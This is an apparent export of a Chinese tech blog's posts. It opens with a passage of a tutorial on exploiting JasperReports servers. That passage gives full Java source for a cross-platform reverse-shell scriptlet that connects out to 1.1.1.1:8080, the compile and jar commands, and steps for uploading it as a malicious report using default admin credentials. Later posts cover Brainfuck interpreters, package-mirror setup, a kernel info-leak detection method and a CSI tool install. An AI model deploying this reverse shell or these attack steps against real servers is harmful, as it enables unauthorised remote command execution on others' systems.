rightPadding="10"&gt;&lt;bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/&gt;&lt;/box&gt;&lt;textElement textAlignment="Right"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA[$V&#123;CityGroup_COUNT&#125;+"."]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:detailCell&gt;&lt;/jr:column&gt;&lt;jr:column width="240" uuid="d472eeed-282a-402b-9044-a397ca270655"&gt;&lt;jr:columnHeader height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="240" height="16" isPrintWhenDetailOverflows="true" uuid="bd0d4582-5684-4e15-8623-b3f1940bf1bb"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.colspan" value="2"/&gt;&lt;/reportElement&gt;&lt;box leftPadding="0" bottomPadding="0" rightPadding="0"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA["Name"]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:columnHeader&gt;&lt;jr:detailCell style="detail" height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="240" height="20" isPrintWhenDetailOverflows="true" uuid="23562605-5611-41d8-8a40-98ad9d28834a"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/&gt;&lt;/reportElement&gt;&lt;box topPadding="4" leftPadding="0" bottomPadding="0" rightPadding="5"&gt;&lt;bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/&gt;&lt;/box&gt;&lt;textFieldExpression&gt;&lt;![CDATA[$F&#123;name&#125;]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:detailCell&gt;&lt;/jr:column&gt;&lt;jr:column width="100" uuid="4612e5a3-cb0d-4533-9b54-9ad9828acbed"&gt;&lt;jr:columnHeader height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="100" height="16" isPrintWhenDetailOverflows="true" uuid="d81f1db2-9f2e-4665-aa47-3d1a49cc9d15"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/&gt;&lt;/reportElement&gt;&lt;box leftPadding="10" bottomPadding="0" rightPadding="0"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA["Phone"]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:columnHeader&gt;&lt;jr:detailCell height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="100" height="20" isPrintWhenDetailOverflows="true" uuid="e48d7dee-a092-45ea-8bd8-8440f76a9fd0"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/&gt;&lt;/reportElement&gt;&lt;box topPadding="4" leftPadding="0" bottomPadding="0" rightPadding="5"&gt;&lt;bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/&gt;&lt;/box&gt;&lt;textFieldExpression&gt;&lt;![CDATA[$F&#123;phone_office&#125;]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:detailCell&gt;&lt;/jr:column&gt;&lt;jr:column width="145" uuid="f0397b7d-4130-4b13-88b1-d89415b269bd"&gt;&lt;jr:columnHeader height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="PageHeader" positionType="Float" stretchType="RelativeToBandHeight" mode="Opaque" x="0" y="4" width="145" height="16" isPrintWhenDetailOverflows="true" uuid="0a1206b8-d0d6-4809-a424-3d7f09606b44"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.th" value="full"/&gt;&lt;/reportElement&gt;&lt;box leftPadding="0" bottomPadding="0" rightPadding="0"/&gt;&lt;textFieldExpression&gt;&lt;![CDATA["Address"]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:columnHeader&gt;&lt;jr:detailCell height="20" rowSpan="1"&gt;&lt;textField isStretchWithOverflow="true"&gt;&lt;reportElement style="detail" positionType="Float" stretchType="RelativeToBandHeight" x="0" y="0" width="145" height="20" isPrintWhenDetailOverflows="true" uuid="7bc63c7e-0224-441b-96ec-8a1bb67a0b84"&gt;&lt;property name="net.sf.jasperreports.export.pdf.tag.td" value="full"/&gt;&lt;/reportElement&gt;&lt;box topPadding="4" leftPadding="0" bottomPadding="0" rightPadding="0"&gt;&lt;bottomPen lineWidth="1.0" lineStyle="Solid" lineColor="#808080"/&gt;&lt;/box&gt;&lt;textFieldExpression&gt;&lt;![CDATA[$F&#123;billing_address_street&#125;]]&gt;&lt;/textFieldExpression&gt;&lt;/textField&gt;&lt;/jr:detailCell&gt;&lt;/jr:column&gt;&lt;/jr:columnGroup&gt;&lt;/jr:table&gt;&lt;/componentElement&gt;&lt;/band&gt;&lt;/summary&gt;&lt;/jasperReport&gt;接下来看42行：&lt;textFieldExpression&gt;&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;&lt;/textFieldExpression&gt;这里我们调用一个getshell的方法在ShellScriptlet_SCRIPTLET。在35行我们定义了一个ShellScriptlet_SCRIPTLET 来引用“foxglove.shell.ShellScriptlet”中的Java代码。&lt;scriptlet name="ShellScriptlet" class="foxglove.shell.ShellScriptlet"&gt;&lt;scriptletDescription&gt;&lt;![CDATA[]]&gt;&lt;/scriptletDescription&gt;&lt;/scriptlet&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101这很简单,但这在Java代码本身是如何定义的呢?编写攻击脚本scriptlet用Java编写,需要去扩展“JRDefaultScriptlet”。我从"here"中借用了一些Java代码来反弹shell并且让这种攻击脚本成为跨平台的。下面就是结果了，要注意“host”和“port”的写法是固定的：package foxglove.shell;import java.io.*;import java.net.*;import java.io.InputStream;import java.io.OutputStream;import java.io.DataInputStream;import net.sf.jasperreports.engine.JRDefaultScriptlet;import net.sf.jasperreports.engine.JRScriptletException; public class ShellScriptlet extends JRDefaultScriptlet implements Runnable&#123; Socket socket; PrintWriter socketWrite; BufferedReader socketRead; PrintWriter commandWrite; BufferedReader commandRead; static String ip; int port = 8080; public String getShell()&#123; ip = "1.1.1.1"; ShellScriptlet shell = new ShellScriptlet(); shell.establishConnection(); new Thread(shell).start(); shell.getCommand(); return "DONE"; &#125; public void run()&#123; spawnShell(); &#125; public void spawnShell()&#123; boolean windows = false; try&#123; if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1)&#123; windows = true; &#125; Runtime rt = Runtime.getRuntime(); Process p; if(windows) p = rt.exec("C:\\Windows\\System32\\cmd.exe"); else p = rt.exec("/bin/sh"); InputStream readme = p.getInputStream(); OutputStream writeme = p.getOutputStream(); commandWrite = new PrintWriter(writeme); commandRead = new BufferedReader(new InputStreamReader(readme)); if(windows) commandWrite.println("dir"); else commandWrite.println("ls -al"); commandWrite.flush(); String line; while((line = commandRead.readLine()) != null)&#123; socketWrite.println(line); socketWrite.flush(); &#125; p.destroy(); &#125;catch(Exception e)&#123;&#125; &#125; public void establishConnection()&#123; try&#123; socket = new Socket(ip,port); socketWrite = new PrintWriter(socket.getOutputStream(),true); socketRead = new BufferedReader(new InputStreamReader(socket.getInputStream())); socketWrite.println("---Connection has been established---"); socketWrite.flush(); &#125;catch(Exception e)&#123;&#125; &#125; public void getCommand()&#123; String foo; try&#123; while((foo=socketRead.readLine())!= null)&#123; commandWrite.println(foo); commandWrite.flush(); &#125; &#125;catch(Exception e)&#123;&#125; &#125; public static void main(String args[])&#123; ShellScriptlet r = new ShellScriptlet(); r.getShell(); &#125;&#125; 对于那些不熟悉Java的,你可以用下面的命令编译在相同的目录中 1/usr/lib/jvm/java-6-openjdk-amd64/bin/javac -Xlint -cp .:jasperreports-5.0.0.jar *.java -d . 这里指定” javac “的完整路径是有原因的(这是Java 1.6)。如果你运行这个命令对某种系统会出错,你需要考虑理想情况下用相同的环境来编译它，至少不是最新的版本！ 接下来我们要做的就是把所有的代码打包趁有个jar文件然后上传到目标站点。你可以使用下面这个代码来完成它： 1/usr/lib/jvm/java-6-openjdk-amd64/bin/jar cvf shell.jar foxglove/ 如果一切进行的顺利，你就会得到个“shell.jar”文件，接下来就准备上传这个到目标站点吧！ 部署这个新的“Report”每个版本的JasperReports似乎都有些不同，但是他们都有相同的函数和工作流。 首先很明显我们要去验证一下“jasperadmin/jasperadmin”： 在我这个版本中，这就立即显示出了有一堆reports样例的“Repository”（要确保“Type”这一列说的是“Report”）。 接下来，我们只要右击一个report并且点击“Edit”就好。 一开始，就点击 “Controls and Resources” 之后点击“Add Resource”。上传我们之前创建的JAR文件并给这个资源命名为“ShellScriptlet”。结束之后我们应该可以看到下图这样的结果： 点击左侧栏的“Set Up”，单击 “Upload a Local file”把我们之前创建的JRXML文件上传了。你应该可以得到下图所示的结果： Jasper 现在让我们去定义一些我们在JRXML文件引用的资源。如果你是一个keener你可能会仅仅把这些资源从JRXML文件中删除。仅仅单击“Add Now”并且上传一些随机的PNG图片文件为你每一个引用资源…当你做完这些应该看起来像下图一样： 现在你只需要点击“Submit”在这个按钮来创建我们的恶意report就好了。哈哈 Shellz!先别激动，在你运行这个report之前，你还要开个监听端口去捕捉你的shell！！！ 之后单击你创建的report，它将会运行Java代码，如果没有什么问题，你就可以看到反弹的shell了。]]></content>
  </entry>
  <entry>
    <title><![CDATA[洛书中的数字规律]]></title>
    <url>%2F2017%2F01%2F22%2F%E6%B4%9B%E4%B9%A6%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%97%E8%A7%84%E5%BE%8B%2F</url>
    <content type="text"><![CDATA[数字规律编辑 那么河图洛书中真的隐含着宇宙之理吗？其内容又是什么呢？我在这里只能先谈洛书，即九宫图。把九宫图中的数字排列来进行详解一番，或可看出一定道理来。首先在九宫图中数字之和等于十五，这一点恐怕所有的人都知道，就是横坚斜相加都等于十五。 4+9+2=15 3+5+7=15 8+1+6=15 4+3+8=15 9+5+1=15 2+7+6=15 4+5+6=15 2+5+8=15 除此之外，还有什么数字玄机呢？ a+b+c=d+e+f a^2+b^2+c^2=d^2+e^2+f^2 我们以左列的438与右列的276为例加以说明。当我们把数递变为两位数相加时，左右两列数字之和依然相等。即43+38+84=27+76+62。从下向上递变依然成立。即83+34+48=67+72+26。 递变为三位数依然相等，即438+384+843=276+762+627。 从下向上递数依然成立，即834+348+483=672+726+267。 再这样递变下去为四位数、五位数、六位数，一百位数、一千位数依然成立。神奇之处还不在这里，更为神奇的是不管是一位，还是两位数三位数的平方相加和依然可以左右相等。比如两位数即43^2+38^2+84^2=27^2+76^2+62^2。 三位数四位数平方和依然可以成立。也就是说一百位也好一千位也好都可以成立。这个数字的神奇排列真是让我莫名惊诧。 再有就是把九宫图用行列式的方法计算，可以得到一个周天数360。在这些数字面前，我不敢想象，这样一个数字排竟然有着不可思议的魔力。 det[4 ，9， 2；3，5，7；8，1，6]=360 就是这样的一个九宫数的排列解开了美国数学家提出的数学怪题，严格等平方和的问题，当时可是无人能解的数学怪题，就连计算机都无能为力。结果被研究洛书的彭绍定数学教授攻克。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Brainfuck]]></title>
    <url>%2F2017%2F01%2F22%2FBrainfuck%2F</url>
    <content type="text"><![CDATA[一些隐写题中可能会出此现这种东西，下面我来大概介绍一下： 官方网站: http://www.muppetlabs.com/~breadbox/bf/ BrainFuck, (An Eight-Instruction Turing-Complete Programming Language), 这个语言本身的语言模型很简单, 有一个byte指针, 有一个初始化为0长度为30000 bytes的数组, byte指针可以在数组内任意移动, 支持下面的八种操作, 指针初始化指向数组的开始. 这个语言只是作者为了写一个很简单的编译器, 才设计的一门语言, 语言和名字一样, 很难读懂, 简单的一些操作用BrainFuck来写都很复杂难读. 八种操作符定义如下: 字符 含义 &gt; 指针加一 &lt; 指针减一 + 指针指向的字节的值加一 - 指针指向的字节的值减一 . 输出指针指向的单元内容（ASCII码） , 输入内容到指针指向的单元（ASCII码） [ 如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处 ] 如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处 Brainfuck程序可以用下面的替换方法翻译成C语言(假设ptr是char*类型)： Brainfuck C &gt; ++ptr; &lt; –ptr; + ++*ptr; - –*ptr; . putchar(*ptr); , *ptr =getchar(); [ while (*ptr) { ] } 举个例子： ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++.&gt;+.+++++++..+++.&lt;&lt;++.&gt;+++++++++++++++.&gt;.+++.------.--------.&lt;&lt;+.&lt;. 这个编译后就是 ‘Hello World!’ 其实只要工具就好了！！！贴一个python实现的解释器： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import os import sys def mainloop(program, bracket_map): pc = 0 tape = Tape() while pc &lt; len(program): code = program[pc] if code == "&gt;": tape.advance() elif code == "&lt;": tape.devance() elif code == "+": tape.inc() elif code == "-": tape.dec() elif code == ".": # print os.write(1, chr(tape.get())) elif code == ",": # read from stdin tape.set(ord(os.read(0, 1)[0])) elif code == "[" and tape.get() == 0: # Skip forward to the matching ] pc = bracket_map[pc] elif code == "]" and tape.get() != 0: # Skip back to the matching [ pc = bracket_map[pc] pc += 1 class Tape(object): def __init__(self): self.thetape = [0] self.position = 0 def get(self): return self.thetape[self.position] def set(self, val): self.thetape[self.position] = val def inc(self): self.thetape[self.position] += 1 def dec(self): self.thetape[self.position] -= 1 def advance(self): self.position += 1 if len(self.thetape) &lt;= self.position: self.thetape.append(0) def devance(self): self.position -= 1 def parse(program): parsed = [] bracket_map = &#123;&#125; leftstack = [] pc = 0 for char in program: if char in ('[', ']', '&lt;', '&gt;', '+', '-', ',', '.'): parsed.append(char) if char == '[': leftstack.append(pc) elif char == ']': left = leftstack.pop() right = pc bracket_map[left] = right bracket_map[right] = left pc += 1 return "".join(parsed), bracket_map def run(fp): program_contents = "" while True: read = os.read(fp, 4096) if len(read) == 0: break program_contents += read os.close(fp) program, bm = parse(program_contents) mainloop(program, bm) if __name__ == '__main__': run(os.open(sys.argv[1], os.O_RDONLY, 0777))#用法：python brain.py flag.br#在.br文件中保存BrainFuck的代码 c编写的： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950include &lt;stdio.h&gt;;int p, r, q;char a[5000], f[5000], b, o, *s=f;void interpret(char *c)&#123; char *d; r++; while( *c ) &#123; switch(o=1,*c++) &#123; case '&lt;': p--; break; case '&gt;': p++; break; case '+': a[p]++; break; case '-': a[p]--; break; case '.': putchar(a[p]); fflush(stdout); break; case ',': a[p]=getchar();fflush(stdout); break; case '[': for( b=1,d=c; b &amp;&amp; *c; c++ ) b+=*c=='[', b-=*c==']'; if(!b) &#123; c[-1]=0; while( a[p] ) interpret(d); c[-1]=']'; break; &#125; case ']': puts("UNBALANCED BRACKETS"), exit(0); case '#': if(q&gt;2) printf("%2d %2d %2d %2d %2d %2d %2d %2d %2d %2d/n%*s/n", *a,a[1],a[2],a[3],a[4],a[5],a[6],a[7],a[8],a[9],3*p+2,"^"); break; default: o=0; &#125; if( p&lt;0 || p&gt;100) puts("RANGE ERROR"), exit(0); &#125; r--;&#125;void main(int argc,char *argv[])&#123; FILE *z; q=argc; if(z=fopen(argv[1],"r")) &#123; while( (b=getc(z))&gt;0 ) *s++=b; *s=0; interpret(f); &#125;&#125; 编译一下就可以用了。 嗯，就这些。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux下使用锐捷的方法]]></title>
    <url>%2F2017%2F01%2F22%2FLinux%E4%B8%8B%E4%BD%BF%E7%94%A8%E9%94%90%E6%8D%B7%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[其实很简单一个命令就搞定（前提是你有这个脚本） 12345678910111213#下载之后先解压：unzip RuijieForLinux.zip#之后cd 进去#在然后呢sudo chmod +x ./rjsupplicant.sh#再然后呢sudo ./rjsupplicant.sh -u 你的学号 -p 你的密码 -s 收费资源/免费资源 第一次使用时，可以通过 –help命令查看使用帮助文档 贴个效果图：]]></content>
  </entry>
  <entry>
    <title><![CDATA[CTF中那些有趣的混淆]]></title>
    <url>%2F2017%2F01%2F22%2FCTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B7%B7%E6%B7%86%2F</url>
    <content type="text"><![CDATA[​ ppencode/rrencode/jjencode/aaencode是Perl、Ruby、Javascript的小工具，可以将各自的代码进行混淆，转换成特殊字符，甚至还可以转换成有意思的表情。 ppencode-Perl台湾的Perl达人唐鳳在YAPC曾经介绍过ppencode，它可以把Perl代码转换成只有英文字母的字符串。 下面是转换示例： Demo的地址：http://namazu.org/~takesako/ppencode/demo.html。 rrencode-Rubyrrencode可以把ruby代码全部转换成符号。 下面是转换示例： 项目地址：http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html。 jjencode/aaencode-Javascriptjjencode和aaencode都是Yosuke HASEGAWA的作品，前者将JS代码转换成只有符号的字符串，类似于rrencode，介绍的PPT见http://utf-8.jp/public/20090710/jjencode.pps。 后者更好玩，可以将JS代码转换成常用的网络表情，例如“(ﾟΘﾟ)”。示例如下： Demo的地址是：http://utf-8.jp/public/aaencode.html，转换的代码并不复杂，可以在源代码里看到。]]></content>
  </entry>
  <entry>
    <title><![CDATA[pip源的修改]]></title>
    <url>%2F2017%2F01%2F22%2Fpip%E6%BA%90%E7%9A%84%E4%BF%AE%E6%94%B9%2F</url>
    <content type="text"><![CDATA[1:在windows环境下修改pip镜像源的方法(以python3.5为例):(1):在windows文件管理器中,输入 %APPDATA% (2):会定位到一个新的目录下，在该目录下新建pip文件夹，然后到pip文件夹里面去新建个pip.ini文 (3):在新建的pip.ini文件中输入以下内容，搞定 1234[global]timeout = 6000index-url = http://pypi.douban.com/simpletrusted-host = pypi.douban.com 2：在linux系统中更新pip源的方式(以centos,python2.7为例)在linux环境下的修改方式和在windows环境下修改方式基本相同，这里简单总结一下: (1):在用户的家目录下面创建名为.pip文件夹 (2):在创建好的.pip文件夹中创建名为pip.conf的文件 (3):在pip.conf文件中输入以下内容，ok!!! 1234[global]timeout = 6000index-url = http://pypi.douban.com/simpletrusted-host = pypi.douban.com 3：macOS更改pip源在终端进入目录：cd ~/ 如果没有 .pip 文件夹，那么就要新建这个文件夹，mkdir .pip 然后在.pip 文件夹内vim pip.conf， 写入阿里云 1234567[global]index-url = http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com 或者可以使用豆瓣的镜像： 1234567[global]index-url = http://pypi.douban.com/simple[install]trusted-host=pypi.douban.com 好了现在你可以体验快的飞起的pip了。]]></content>
  </entry>
  <entry>
    <title><![CDATA[你会用你的虚拟机吗?(一)]]></title>
    <url>%2F2017%2F01%2F22%2F%E4%BD%A0%E4%BC%9A%E7%94%A8%E4%BD%A0%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%97-%E4%B8%80%2F</url>
    <content type="text"><![CDATA[怎么可以让你的虚拟机运行的更快呢？ 1、开启CPU的硬件虚拟化功能现在的CPU几乎都支持硬件虚拟化功能，英特尔称之为VT-x技术，AMD称之为AMD-V技术。在百度搜索你的笔记本型号或主板型号+开启虚拟化，就可以找到相应的开启方法。一般是开机进入bios，然后找到虚拟化技术的选项，将disabled改为enabled。据我所知，用英特尔CPU的电脑，虚拟化技术的选项名称大概含有“virtualization technology”的字眼。 BIOS开启成功后，在虚拟机的设置中，启用硬件加速。 当你成功开启硬件虚拟化功能时，虚拟机的窗口右下角有一个蓝色V的图标，鼠标移上去就会提示成功开启。 2、给虚拟机分配足够的内存既然本机有4GB的内存，那么可以分配1GB供虚拟机上的Ubuntu使用。内存大小根据虚拟机系统的需要来定，如果你跑XP，那么分配512MB已经很足够了。 3、开启3D加速，分配足够显存笔者觉得当初Ubuntu界面卡顿很有可能跟显卡方面的设置有关。于是开启了3D加速，分配了32MB的显存给VirtualBox。性能提升很明显。 4、安装VirtualBox增强功能启动虚拟机。单击虚拟机菜单中的“设备”&gt;“安装增强功能”，也可以按快捷键Host+D。Host键就是虚拟机窗口右下方显示的键，默认为Right Ctrl，即右边的Ctrl键。然后系统会加载增强功能所在的虚拟光盘。点击运行，按提示完成安装，重启虚拟机。 5、电脑的核心都挺多的多分个核就好了。]]></content>
  </entry>
  <entry>
    <title><![CDATA[gem更换国内源]]></title>
    <url>%2F2017%2F01%2F22%2Fgem%E6%9B%B4%E6%8D%A2%E5%9B%BD%E5%86%85%E6%BA%90%2F</url>
    <content type="text"><![CDATA[12345678910111213gem sources -l#移除https://rubygems.org源gem sources --remove https://rubygems.org/#增加https://gems.ruby-china.org/源gem sources -a https://gems.ruby-china.org/#更新缓存gem sources -u]]></content>
  </entry>
  <entry>
    <title><![CDATA[替换homebrew默认源]]></title>
    <url>%2F2017%2F01%2F22%2F%E6%9B%BF%E6%8D%A2homebrew%E9%BB%98%E8%AE%A4%E6%BA%90%2F</url>
    <content type="text"><![CDATA[网上搜的好多都不能用了，但是这个是可以的。 12cd "$(brew --repo)"git remote set-url origin git://mirrors.ustc.edu.cn/brew.git]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux内核info leak漏洞]]></title>
    <url>%2F2017%2F01%2F22%2FLinux%E5%86%85%E6%A0%B8info-leak%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[摘要: 介绍一种Linux内核的信息泄漏漏洞检测方法。没什么内容，语义分析，可以集成在Coverity等静态扫描工具中。 1 Information Leak漏洞风险从应用层软件，到hypervisor再到kernel代码，都存在Information Leak的风险。下面给出一些示例： 应用层软件：通常是应用敏感数据泄漏，比如从远程客户端获取服务端敏感数据。CVE-2012-0053，Openssl的心脏滴血等。 Hypervisor：主要是向guest泄漏hypervisor数据。CVE-2010-4525. Kernel代码：泄漏内核地址，空间布局等，如CVE-2013-2147. 这里主要分析内核中的Information Leak漏洞所带来的风险。内核中的Information Leak通常都是用来绕过内核中的保护机制（利用缓解：StackGuard, ASLR），由于本身并不能直接用来形成提权等高风险操作，因此Information Leak漏洞经常被人忽视。 先来看一下这些保护机制。 StackGuard. StackGuard是一种编译器实现的保护技术，它在栈函数返回地址前插入一个“canary”，当发生溢出“canary”值被破坏，将触发系统的异常处理流程。它的安全性依赖于“canary”的保密，也就是“canary”不能被攻击者预测或取到。 ASLR. ASLR技术是将进程等的加载地址随机化，它的安全性依赖于加载基地址的不可预测，使exploit不能精确进行地址覆盖。 无论“canary”还是ASLR的基地址，对攻击者来说都是“秘密”。也就是在没有Information Leak漏洞前提下，这些都是用户不可直接获取的。但Information Leak漏洞可以辅助攻击者获取到这些“秘密”，进而绕过内核中的保护机制，成功实现漏洞利用。 2 Information Leak漏洞分类根据漏洞成因，可以对Information Leak漏洞进行分类。这里同样只关注内核中的情况。 字节对齐带来的内存“空洞”. 为了程序性能，编译器在编译代码时会对变量进行字节对齐，从而引入了一些内存“空洞”。比如结构体使用sizeof计算的大小一般会大于各个成员占用空间大小的和。当这些内核中的内存“空洞”没有被初始化（ABI没有规定函数退栈时要清理这些栈空间），通过copy_to_user等函数拷贝到用户空间时，就会造成Information Leak漏洞，泄漏内核栈中的数据，比如泄漏了一个栈上指针，就可以通过它来计算进程基址（stackjack攻击）。 缺少变量初始化. 内核函数中的本地变量声明后，默认不会被初始化。根据C99描述这块空间的内容是不确定的。实际上栈空间是被各函数复用的，因此未初始化变量的内容很可能保存的是上个函数栈上的数据。 缺少对用户读操作的检查. 当向用户空间拷贝数据时，没有做大小检查或者检查逻辑出现错误，都会导致Information Leak。这类漏洞通常称作“越界读”，它允许用户态读取不应该被访问的内核空间数据。 其它bug导致的infoleaks. 其它的Information Leak原因这里不做研究，但提一下。比如/proc/,/sys/和/boot/文件系统中也提供了内核符号地址，它们已经靠kptr_restrict机制保护，但也可能因为bug而绕过。另外系统缓存，日志等都有可能导致Information Leak. 上面说到Information Leak可能危害保证StackGuard和ASLR可靠基础的“秘密”，下面分析一下内核中的Information Leak确切会影响哪些数据。 Data段. 内核中的data段保存了编译时就确定的全局变量，data段的泄漏可能导致静态内核symbols的泄漏，比如某些用于配置的变量。 栈 内核栈是根据ABI约定，运行时分配的。里面包含了函数返回地址，栈指针和一些其它数据。比如函数调用的参数，StackGuard机制的“canary”等。另外如果没有实现栈地址随机化，还会泄漏栈布局。 堆 内核中的堆是由内存分配器管理，在需要的地方动态分配。这些堆分配器通常使用双向链表来管理这些堆内存。Information Leak会漏洞这些堆存储的内容，还有可能泄漏用于堆管理的结构数据。 3 栈的Information Leak漏洞检测技术分析目前的漏检测技术，发现通过数据流分析的方法，可以对Information Leak进行建模来进行漏洞检测。在模型里定义3个基本元素：数据源，数据接收方和传播路径。 我们可以对程序进行语义分析来匹配这套模型，从而识别漏洞。语义分析这个工作，选用开源的Coccinelle工具。 12345678910111213handler(...) &#123; &lt;... T ID; ... when != memset(&amp;ID, 0, ...) when != ID = ...* copy_to_user(EV, &amp;ID, EN) ...&gt;&#125; 1) 数据源：ID变量 2) 数据接收方：用户态指针EV 3) 传播路径：我们想确定ID的内容没有被初始化。因此限定条件，ID在copy_to_user前没有memset()或初始化操作 像其它基于数据流的静态检测技术类似，这种方法也存在缺陷。比如这种Information Leak检测方法假定漏洞发生在一个函数内的，因此这种方法覆盖不了多函数场景。但实际测试中，依然会发现很多Linux内核和三方Driver的Information Leak漏洞。]]></content>
  </entry>
  <entry>
    <title><![CDATA[linux-csi-tools部署记录]]></title>
    <url>%2F2017%2F01%2F21%2Flinux-csi-tools%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[我采用old installation instruction 的方法，并对里面个别几个地方有所修改，以适应国内有墙的现状。参考了一部分这个博客。打开终端把代码复制到终端运行即可。 准备工作我安装了Ubuntu10.04 desktop-i386版，使用的是刻录光盘镜像的方法，大家也可以制作启动u盘或者用虚拟机安装到物理硬盘（我最喜欢的方式）。注意/home分区要留足够的空间（建议10gb以上），/分区也要足够大，建议5gb以上。其他部分很简单，按照安装包的指示一步步来就可以。因为要编译新内核，根目录空间不足的话会不成功。安装的时候注意几个问题，linux碎片化严重，用不受支持的linux发行版或版本会导致编译失败，非常令人头疼。而ubuntu lts版支持时间也不长，安装软件的话如果apt用不了可以试着去百度或launchpad找deb包。 到对方提供的github网址里面，下载源代码，到右栏可以找到download zip file，下载完毕之后解压放到～/下面，文件夹改名为linux-80211n-csitool（放到别的地方也可以，不过需要修改下面每一条引用它的代码），由于国内网络环境不好，文件过大，用git clone的话及其容易失败，其他的小文件没关系，大家自己解决vpn吧，到网上搜索linvpn应该可以用一阵子，不过ubuntu的vpn设置方面有几点需要注意，百度上面也有介绍。现在比较好用的解决网络问题的方案是lantern和hosts 1sudo gedit /etc/modprobe.d/blacklist.conf 把下面内容粘贴进去，保存。 12345# blacklist modules under active development blacklist iwldvm blacklist iwlwifi blacklist mac80211 blacklist cfg80211 该步骤是为了禁止wifi，这样做的目的是让安装驱动的时候不容易出问题 Install necessary packages on Ubuntu安装内核组件 1sudo apt-get -y install git-core kernel-package fakeroot build-essential ncurses-dev 它们是用来编译用户空间工具的库 1sudo apt-get -y install libnl-dev libssl-dev # Install some necessary libraries iw可以用来在命令行界面开启wifi的监控模式和开启40mhz信道。 1sudo apt-get -y install iw Download, configure, compile, and install our custom Linux kernel下载附加的工具 1git clone git://github.com/dhalperi/linux-80211n-csitool-supplementary.git 设置内核 123cd linux-80211n-csitool # Go into the kernel src directorymake oldconfig # Use our optimized kernel configmake menuconfig # Enable your system-specific hardware 编译内核 12345make -j3 bzImage modules # -j3 here is 3-way parallelism, try #cores+1sudo make install modules_install # INSTALLsudo mkinitramfs -o /boot/initrd.img-`cat include/config/kernel.release` \ `cat include/config/kernel.release` # create ramdisk used to bootsudo update-grub 我在这些步骤里面出现了编译错误的情况，原因是里面的一些头文件和源代码文件名大小写不一致，解决方法是想办法把它复制一下，然后改成大小写一致的文件名（原来的不要删掉） 在一篇csdn blog里面，有人还这么说，如果编译出错，可以试着按照这里来做（关于这一部分，先在窗口输入cat include/config/kernel.release（注意是在 linux-80211n-csitool目录下）获取版本号，一般为3.5.7-csitool。将上述指令改为：sudo mkinitramfs -o /boot/initrd.img-3.5.7-csitool 3.5.7-csitool （注意空格）即可。后续的指令中均要将‘cat include/config/kernel.release’改为3.5.7-csitool）然而这个方法并不好用 下面安装头文件，记录csi的软件需要用它来编译 12sudo mkdir /usr/src/linux-headers-`cat include/config/kernel.release`sudo cp -rf usr/include /usr/src/linux-headers-`cat include/config/kernel.release`/include 编译成功之后重启，就会进入修改过的内核 Install our custom firmware.1sudo gedit /etc/modprobe.d/blacklist.conf 这一步把blacklist iwlwifi删掉，否则无法连接wifi，删掉之后只能连接没密码的wifi。运行下面的 1234567#backup original firmware, good for referencesudo cp /lib/firmware/iwlwifi-5000-2.ucode /lib/firmware/iwlwifi-5000-2.ucode.origsudo mv /lib/firmware/iwlwifi-5000-2.ucode /lib/firmware/iwlwifi-5000-2.ucode.orig# copy ours in separately, keeping name for referencesudo cp iwlwifi-5000-2.ucode.sigcomm2010 /lib/firmware/# install ourssudo cp iwlwifi-5000-2.ucode.sigcomm2010 /lib/firmware/iwlwifi-5000-2.ucode 